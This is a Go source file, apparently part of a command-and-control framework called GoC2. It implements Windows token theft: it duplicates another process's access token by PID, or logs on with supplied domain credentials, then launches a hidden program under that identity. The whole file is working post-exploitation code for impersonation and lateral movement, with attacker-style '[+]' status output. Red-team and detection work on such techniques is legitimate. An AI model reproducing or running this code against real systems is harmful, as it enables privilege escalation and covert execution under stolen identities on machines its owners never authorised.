//go:build windows
// +build windows

package createprocess

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"syscall"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func CreateProcessWithTokenViaPid(args []string) (string, error) {
	if len(args) < 2 {
		return "", errors.New("Not Enough Args")
	}
	pidStr := args[0]
	binaryArgsW := args[1:]
	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return "", err
	}
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		return "", err
	}
	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
	if err != nil {
		return "", err
	}
	si := &windows.StartupInfo{}
	si.ShowWindow = winapi.ShowWindow
	si.Flags = si.Flags | winapi.STARTF_USESHOWWINDOW
	pi := &windows.ProcessInformation{}
	binaryArgs := syscall.StringToUTF16Ptr(strings.Join(binaryArgsW, " "))
	err = windows.CreateProcessAsUser(duplicatedToken, nil, binaryArgs, nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, si, pi)
	if err != nil {
		ok, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 2, binaryArgs, windows.CREATE_NO_WINDOW, 0, si, pi)
		if !ok {
			return "", err
		}
		return fmt.Sprintf("[+] Used CreateProcessWithToken to start process %d may not have access to domain resources", pi.ProcessId), err
	}
	return fmt.Sprintf("Started Process Id %d", pi.ProcessId), nil
}

func CreateProcessWithTokenViaCreds(args []string) (string, error) {
	domainW := args[0]
	userW := args[1]
	passW := args[2]
	binaryArgsW := args[3:]
	binaryArgs := syscall.StringToUTF16Ptr(strings.Join(binaryArgsW, " "))
	startupInfo := &windows.StartupInfo{}
	startupInfo.ShowWindow = winapi.ShowWindow
	startupInfo.Flags = startupInfo.Flags | winapi.STARTF_USESHOWWINDOW
	processInfo := &windows.ProcessInformation{}
	var hToken syscall.Handle
	ok, err := winapi.LogonUser(userW, domainW, passW, 8, 3, &hToken)
	if !ok {
		return "", err
	}
	err = windows.CreateProcessAsUser(windows.Token(hToken), nil, binaryArgs, nil, nil, false, windows.CREATE_NO_WINDOW, nil, nil, startupInfo, processInfo)
	if err != nil {
		si := &windows.StartupInfo{}
		si.ShowWindow = winapi.ShowWindow
		si.Flags = si.Flags | winapi.STARTF_USESHOWWINDOW
		pi := &windows.ProcessInformation{}
		ok, err := winapi.CreateProcessWithTokenW(syscall.Handle(hToken), 2, binaryArgs, windows.CREATE_NO_WINDOW, 0, si, pi)
		if !ok {
			return "", err
		}
		return fmt.Sprintf("[+] Used CreateProcessWithToken to start process %d may not have access to domain resources", pi.ProcessId), err
	}
	completed := fmt.Sprintf("[+] Started Process %d", processInfo.ProcessId)
	return completed, nil
}
